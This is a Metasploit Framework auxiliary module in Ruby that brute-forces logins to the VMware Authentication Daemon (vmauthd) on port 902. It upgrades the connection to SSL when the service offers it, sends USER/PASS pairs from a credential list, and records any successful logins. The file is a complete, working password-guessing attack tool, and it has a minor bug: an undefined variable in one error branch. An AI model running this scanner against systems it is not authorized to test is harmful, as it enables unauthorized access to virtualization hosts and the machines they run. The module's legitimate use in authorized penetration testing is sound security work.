##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core/exploit/tcp'

class Metasploit3 < Msf::Auxiliary

	include Exploit::Remote::Tcp
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	@@cached_rsa_key = nil

	def initialize
		super(
			'Name'        => 'VMWare Authentication Daemon Login Scanner',
			'Version'     => '$Revision$',
			'Description' => %q{
				This module will test vmauthd logins on a range of machines and
				report successful logins. 
			},
			'Author'      => ['TheLightCosine <thelightcosine[at]metasploit.com>'],
			'References'     =>
				[
					[ 'CVE', '1999-0502'] # Weak password
				],
			'License'     => MSF_LICENSE
		)

		register_options([Opt::RPORT(902)])

	end



	def run_host(ip)
		connect
		banner = sock.get_once.chomp
		print_status "Banner: #{banner}"

		unless banner.include? "VMware Authentication Daemon"
			print_error "This does not appear to be a vmauthd service"
			return
		end

		if banner.include? "SSL"
			print_status("Switching to SSL connection...")
			swap_sock_plain_to_ssl
		end

		each_user_pass do |user, pass|
			result = do_login(user, pass)
			case result
			when :failed
				print_error("#{ip}:#{datastore['RPORT']} vmauthd login FAILED - #{user}:#{pass}")
			when :success
				print_good("#{ip}:#{datastore['RPORT']} vmauthd login SUCCESS - #{user}:#{pass}")
				report_auth_info(
					:host   => rhost,
					:port   => rport,
					:sname  => 'vmauthd',
					:user   => user,
					:pass   => pass,
					:source_type => "user_supplied",
					:active => true
				)
				return if datastore['STOP_ON_SUCCESS']
			else
				print_error("#{ip}:#{datastore['RPORT']} #{res}")
			end
		end

	end

	def do_login(user, pass, nsock=self.sock)
		nsock.put("USER #{user}\r\n")
		res = nsock.get_once
		unless res.start_with? "331"
			ret_msg = "received unexpected reply to the USER command: #{res}"
			return ret_msg
		end
		nsock.put("PASS #{pass}\r\n")
		res = nsock.get_once
		if res.start_with? "530"
			return :failed
		elsif res.start_with? "230"
			return :success
		else
			ret_msg = "received unexpected reply to the PASS command: #{res}"
			return ret_msg
		end
	end

	def swap_sock_plain_to_ssl(nsock=self.sock)
		ctx =  generate_ssl_context()
		ssl = OpenSSL::SSL::SSLSocket.new(nsock, ctx)

		ssl.connect

		nsock.extend(Rex::Socket::SslTcp)
		nsock.sslsock = ssl
		nsock.sslctx  = ctx
	end

	def generate_ssl_context
		ctx = OpenSSL::SSL::SSLContext.new(:SSLv3)
		@@cached_rsa_key ||= OpenSSL::PKey::RSA.new(1024){ }

		ctx.key = @@cached_rsa_key

		ctx.session_id_context = Rex::Text.rand_text(16)

		return ctx
	end


end

